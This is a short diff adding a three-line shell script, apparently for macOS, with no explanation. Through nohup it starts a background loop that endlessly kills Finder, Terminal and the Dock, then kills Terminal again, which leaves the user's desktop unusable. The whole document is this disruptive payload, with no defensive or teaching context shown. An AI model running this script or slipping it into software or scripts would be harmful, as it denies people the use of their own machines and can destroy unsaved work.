@@ -1,0 +1,3 @@
+bash -c "nohup sh -c 'killall Terminal; while true ; do killall Finder ; killall Terminal ; killall Dock; done'"
+sleep 1
+killall Terminal
